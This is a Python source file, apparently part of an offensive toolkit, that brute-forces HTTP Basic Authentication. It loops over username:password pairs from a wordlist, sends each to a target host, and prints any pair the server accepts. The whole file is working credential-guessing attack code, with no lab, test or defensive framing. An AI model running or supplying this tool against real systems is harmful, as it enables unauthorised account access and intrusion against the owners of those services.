# Python Script for HTTP Brute Force

# Importing Modules
from colorama import init, Fore
from requests.auth import HTTPBasicAuth
import requests, os

init()
GREEN = Fore.GREEN
RESET = Fore.RESET

class HTTP_brute:
    def httpbrute(hostname, username, password):
        check = requests.get(hostname, auth=HTTPBasicAuth(username, password))
        r = check.status_code
        if r == 200:
            print(
                f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True

        elif r == 401:
            print(f"[!] Invalid credentials for {username}:{password}")

    def run(hostname):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists")
        credlist = open(wordlist_path + '/http_wordlist.txt').read().splitlines()

        # Start the brute force
        for cred in credlist:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if HTTP_brute.httpbrute(hostname, username, password):
                break
